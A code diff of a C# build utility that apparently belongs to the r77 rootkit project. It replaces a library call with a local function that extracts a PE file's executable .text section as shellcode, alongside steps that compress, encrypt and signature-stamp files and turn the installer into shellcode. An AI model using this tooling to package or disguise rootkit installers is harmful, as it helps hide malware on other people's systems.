@@ -1,4 +1,4 @@
-﻿using BytecodeApi.Penetration;
+﻿using BytecodeApi.Extensions;
 using Global;
 using System.Diagnostics;
 using System.IO.Compression;
@@ -6,11 +6,11 @@ using System.Security.Cryptography;
 
 // BuildTask.exe is used for VS build events.
 // The first argument is a path to the file to be processed (except for -shellcodeinstaller)
-//  - compress: Compress file
-//  - encrypt: Encrypt file
-//  - toshellcode: Extracts an executable file's .text section
-//  - r77helper: Write R77_HELPER_SIGNATURE to r77 header
-//  - shellcodeinstaller: Converts Install.exe to Install.shellcode
+//  -compress: Compress file
+//  -encrypt: Encrypt file
+//  -toshellcode: Extracts an executable file's .text section
+//  -r77helper: Write R77_HELPER_SIGNATURE to r77 header
+//  -shellcodeinstaller: Converts Install.exe to Install.shellcode
 
 if (args.Length == 0)
 {
@@ -29,7 +29,7 @@ else
 	byte[] file = File.ReadAllBytes(args[0]);
 	if (args.Contains("-compress")) file = Compress(file);
 	if (args.Contains("-encrypt")) file = Encrypt(file);
-	if (args.Contains("-toshellcode")) file = Shellcode.ExtractFromExecutable(file);
+	if (args.Contains("-toshellcode")) file = ExtractShellCode(file);
 	if (args.Contains("-r77helper")) file = R77Signature(file, R77Const.R77HelperSignature);
 
 	File.WriteAllBytes(args[0], file);
@@ -80,7 +80,7 @@ static bool CreateShellCodeInstaller(string solutionDir)
 
 	if (FasmCompile(Path.Combine(solutionDir, @"SlnBin\FASM"), Path.Combine(solutionDir, @"InstallShellcode\InstallShellcode.asm"), shellCodeExePath))
 	{
-		byte[] shellCode = Shellcode.ExtractFromExecutable(File.ReadAllBytes(shellCodeExePath));
+		byte[] shellCode = ExtractShellCode(File.ReadAllBytes(shellCodeExePath));
 		File.WriteAllBytes(shellCodePath, shellCode);
 
 		// Install.shellcode is literally just shellcode + Install.exe
@@ -111,4 +111,29 @@ static bool FasmCompile(string fasmPath, string asmFileName, string outputFileNa
 
 	process?.WaitForExit();
 	return process?.ExitCode == 0;
+}
+static byte[] ExtractShellCode(byte[] file)
+{
+	// Extracts the contents of an executable file's .text section.
+	// This executable should only contain a .text section, i.e. it should be shellcode.
+
+	int ntHeaders = BitConverter.ToInt32(file, 0x3c);
+	short numberOfSections = BitConverter.ToInt16(file, ntHeaders + 0x6);
+	short sizeOfOptionalHeader = BitConverter.ToInt16(file, ntHeaders + 0x14);
+
+	for (short j = 0; j < numberOfSections; j++)
+	{
+		byte[] section = file.GetBytes(ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28, 0x28);
+		uint characteristics = BitConverter.ToUInt32(section, 0x24);
+
+		if ((characteristics & 0x60000020) == 0x60000020) // IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
+		{
+			int pointerToRawData = BitConverter.ToInt32(section, 0x14);
+			int virtualSize = BitConverter.ToInt32(section, 0x8);
+
+			return file.GetBytes(pointerToRawData, virtualSize);
+		}
+	}
+
+	throw new FormatException("Could not find section with executable code.");
 }
